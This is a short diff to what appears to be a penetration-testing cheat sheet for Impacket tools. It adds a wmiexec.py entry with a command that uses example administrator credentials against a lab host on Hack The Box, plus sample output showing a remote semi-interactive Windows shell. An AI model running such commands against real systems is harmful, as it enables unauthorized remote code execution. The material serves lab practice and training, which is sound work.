@@ -122,3 +122,17 @@ Impacket v0.9.25.dev1+20220131.200424.badf09d - Copyright 2021 SecureAuth Corpor
 [!] Launching semi-interactive shell - Careful what you execute
 C:\Windows\system32>
 ```
+### wmiexec.py
+```
+wmiexec.py example.htb/administrator:Password123@10.129.237.154
+```
+Example output:
+```
+$ wmiexec.py example.htb/administrator:Password123@10.129.237.154
+Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 
+
+[*] SMBv2.1 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>
+```
